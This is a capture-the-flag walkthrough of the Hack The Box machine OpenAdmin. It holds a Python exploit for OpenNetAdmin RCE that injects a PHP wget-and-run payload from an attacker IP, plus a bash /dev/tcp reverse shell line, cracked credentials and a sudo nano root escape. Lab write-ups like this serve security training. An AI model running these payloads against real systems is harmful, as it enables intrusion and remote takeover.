---
layout: post
title: "Hack The Box - OpenAdmin"
description: "This is my walkthrough for OpenAdmin from Hack The Box."
thumb_image: "documentation/hack-the-box/openadmin/openadmin.jpg"
tags: [security, 'hack the box', machines, ssh, mysql, root, openadmin]
---

{% include image.html path="documentation/hack-the-box/openadmin/openadmin.jpg" path-detail="documentation/hack-the-box/openadmin/openadmin.jpg" alt="OpenAdmin" %}

It was an easy machine from **Hack The Box** with:

- 0day vulnerability with RCE on old version.
- SSH credentials in `mysql` config file.
- SSH private key on some internal network running in the background.
- GTFOBins on file owned by root.

## 1. Enumeration

First things first lets add 10.10.10.171 in `/etc/hosts` as `openadmin.htb` and enumerate our machine with `nmap` to discover open ports and services.

{% highlight console %}
root@kali:~$ nmap -sV -sC -sT -o openadmin openadmin.htb
# Nmap 7.70 scan initiated Mon Jan  6 19:35:31 2020 as: nmap -sV -sT -sC -o openadmin 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.19s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE   VERSION
22/tcp   open     ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp   open     http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
1092/tcp filtered obrpd
1185/tcp filtered catchpole
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  6 19:36:37 2020 -- 1 IP address (1 host up) scanned in 66.58 seconds
{% endhighlight %}

We found `http` on port `80` and `ssh` on port `22` and 2 other filtered ports.

The home page was `apache` default page and nothing else:

{% include image.html path="documentation/hack-the-box/openadmin/default.jpg" path-detail="documentation/hack-the-box/openadmin/default.jpg" alt="OpenAdmin" %}

I tried different URLs but still nothing, so lets jump into `gobuster` to enumerate other pages and directories:

{% highlight console %}
root@kali:~$ gobuster dir -u http://openadmin.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://openadmin.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/02/02 20:10:17 Starting gobuster
===============================================================
/music (Status: 301)
Progress: 980 / 87665 (1.12%)
{% endhighlight %}

We found `/music` page lets see its content:

{% include image.html path="documentation/hack-the-box/openadmin/music.jpg" path-detail="documentation/hack-the-box/openadmin/music.jpg" alt="OpenAdmin" %}

It's a beautiful UI with some interesting links: `login` redirect to `openadmin.htb/ona` and `create an account` to nothing. Lets click on `login` to see what it goes:

{% include image.html path="documentation/hack-the-box/openadmin/ona.jpg" path-detail="documentation/hack-the-box/openadmin/ona.jpg" alt="OpenAdmin" %}

I struggled for a while trying to figure out what is this, then I found a login page:

{% include image.html path="documentation/hack-the-box/openadmin/ona_login.jpg" path-detail="documentation/hack-the-box/openadmin/ona_login.jpg" alt="OpenAdmin" %}

I tried `admin:admin` and it worked, but something wrong it redirect to the previous page with guest account not as admin. I intercepted the login request and send it using `burp` to see more details, but also nothing. I stuck a little, so I decided to search what is this application!.

> "OpenNetAdmin is a system for tracking IP network attributes in a database. A web interface is provided to administer the data, and there is a fully functional CLI interface for batch management."

## 2. Exploitation

I found RCE exploit with `searchsploit`, but the version `13.03` is older than running on the box `18.1.1`:

{% highlight console %}
root@kali:~$ searchsploit opennetadmin
----------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                         |  Path
                                                                       | (/usr/share/exploitdb/)
----------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                          | exploits/php/webapps/26682.txt
----------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
{% endhighlight %}

I always like trying old things to see if it still work or not. The file `26682.txt` contains some info about the exploit with `HTML` code as a PoC by **Mandat0ry** (aka Matthew Bryant). I didn't like `HTML` to exploit the application, so I wrote some `python` script to automate our process:

{% highlight python %}
#!/usr/bin/env python

from termcolor import colored
from requests import get, post

def RS():
    from random import choice
    from string import ascii_lowercase
    return ''.join(choice(ascii_lowercase) for i in range(4))

def exploit():
    url = 'http://openadmin.htb/ona/dcm.php'
    php_shell = "<?php exec('wget 10.10.15.253:8000/shell.sh;bash shell.sh') ?>"
    mod_name = RS()
    params, options = dict(), dict()

    options['desc'] = php_shell # php code
    options['name'] = mod_name  # module name to inject the code
    options['file'] = '../../../../../../../../../../../var/log/ona.log' # the file itself that

    params['options[desc]'] = options['desc']
    params['module'] = 'add_module'
    params['options[name]'] = options['name']
    params['options[file]'] = options['file']

    print colored('[!] Sending our payload...', 'yellow')
    post_shell = post(url, params = params)
    print colored('[+] Done', 'green')

    print colored('[!] Spawning a shell...', 'yellow')
    get_rce = url + '?module=' + mod_name
    get_shell = get(get_rce)
    print get_shell.text

exploit()
{% endhighlight %}

Simply, The exploit works because we can add modules without any type of authentication. Modules are in this form:

{% highlight console %}
module[name] = The name of the function that will be run out of the included file
module[description] = Irrelevant description of the module (unless some PHP code is injected here hmm?)
module[file] = The file to be included and then the function
{% endhighlight %}

We can inject some `PHP` code into `/var/log/ona.log` file via the module description parameter. Every time a module is added to **OpenNetAdmin** app the `description, name` are all logged into this log file.
By setting the module filepath to `../../../../../../../../../../../var/log/ona.log`, so we can include the log file as a module.

I tried to inject `bash -i >& /dev/tcp/10.10.15.253/1337 0>&1` as a reverse shell, but it didn't work because of the way the logger script works we cannot use any `<` or `>`. So, I tried to escape it using `\>`, but also didn't work. 

Lets write the above script into a `shell.sh` file and upload it into the box and wait for a shell:

{% include image.html path="documentation/hack-the-box/openadmin/exploit.jpg" path-detail="documentation/hack-the-box/openadmin/exploit.jpg" alt="OpenAdmin" %}

We got a shell with an old 0day exploit as `www-data`, now lets dive into privesc.

## 3. Privilege Escalation

First thing I though is to search for any interesting files, then I stuck a little until I found `mysql` database settings file inside `local/config` folder:

{% include image.html path="documentation/hack-the-box/openadmin/settings.jpg" path-detail="documentation/hack-the-box/openadmin/settings.jpg" alt="OpenAdmin" %}

The file contains database creds

{% highlight php %}
<?php
$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
{% endhighlight %}

Lets try login to `mysql` and see the available users:

{% include image.html path="documentation/hack-the-box/openadmin/mysql.jpg" path-detail="documentation/hack-the-box/openadmin/mysql.jpg" alt="OpenAdmin" %}

We got two `md5` hashes after cracking `guest:test` and `admin:admin`. I tried `ssh` using those creds but nothing worked. After awhile I went back to what I've gained so far and thought lets try database password to switch with an existing users. I tried first user `jimmy` and it worked:

{% include image.html path="documentation/hack-the-box/openadmin/jimmy.jpg" path-detail="documentation/hack-the-box/openadmin/jimmy.jpg" alt="OpenAdmin" %}

## 4. Internal Network

This user isn't the actual user so, as we saw above there is another user `joanna`. I struggled with this a lot searching for files and finally I got a folder called `internal` inside `/var/www` :

{% highlight console %}
    282830      4 -rwxrwxr-x   1 jimmy            internal                     339 Nov 23 17:40 /var/www/internal/main.php
      2644      4 -rwxrwxr-x   1 jimmy            internal                     185 Nov 23 16:37 /var/www/internal/logout.php
      1387      4 -rwxrwxr-x   1 jimmy            internal                    3229 Nov 22 23:24 /var/www/internal/index.php
{% endhighlight %}

I got an interesting `php` code inside `index.php` file:

{% highlight php %}
<?php
$msg = '';
if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
  if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f...') {
      $_SESSION['username'] = 'jimmy';
      header("Location: /main.php");
  } else {
      $msg = 'Wrong username or password.';
  }
}
?>
{% endhighlight %}

The script wants to login via `main.php` using `jimmy` as a username and `sha512(password)` must match the following hash:
`00e302ccdcf1c60b8ad5...`. After we decrypt the hash we got `Revealed` as a password.

Now lets see what other services running on the box:

{% highlight console %}
jimmy@openadmin:~$ netstat -lnpt | grep LISTEN
netstat -lnpt | grep LISTEN
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
{% endhighlight %}

We got a `TCP` service running locally on port `52846`. Lets post our data on `127.0.0.1:52846/main.php` usign `curl`:

{% include image.html path="documentation/hack-the-box/openadmin/priv_key.jpg" path-detail="documentation/hack-the-box/openadmin/priv_key.jpg" alt="OpenAdmin" %}

Oh! we got `ssh` private key lets extract it using `ssh2john`:

{% highlight console %}
root@kali:~$ ssh2john rsa_priv.key > joanna.priv
{% endhighlight %}

Now, lets crack it using `john`:

{% highlight console %}
root@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.priv 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (rsa_priv.key)
1g 0:00:00:12 DONE (2020-02-03 01:20) 0.07855g/s 1126Kp/s 1126Kc/s 1126KC/s *7¡Vamos!
Session completed
{% endhighlight %}

And now we have our password `bloodninjas`, lets `ssh` with `joanna` and own user:

{% include image.html path="documentation/hack-the-box/openadmin/joanna.jpg" path-detail="documentation/hack-the-box/openadmin/joanna.jpg" alt="OpenAdmin" %}

## 5. Own Root

Lets find what else we can do to own `root`, after deep diving for any important things related to `joanna`I found `/etc/sudoers.d/joanna` owned by `root`. Sudoers files just contains rights for who can access what in the system.

{% highlight console %}
joanna@openadmin:~$ cat /etc/sudoers.d/joanna
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
{% endhighlight %}

This line above just tell the system give all `sudo` privileges to user `joanna` with no password to execute `nano` on `/opt/priv`. We can take advantage of that by execute commands from `/bin/nano` bypassing all local security restrictions. See [GTFOBins](https://gtfobins.github.io/).

Now we can run `sudo nano /opt/priv`, and press `ctr + R` to read a file then `ctr + X` to execute root commands and type:

{% highlight bash %}
reset; bash 1>&0 2>&0;
{% endhighlight %}

And finally we owned `root`:

{% include image.html path="documentation/hack-the-box/openadmin/root.jpg" path-detail="documentation/hack-the-box/openadmin/root.jpg" alt="OpenAdmin" %}
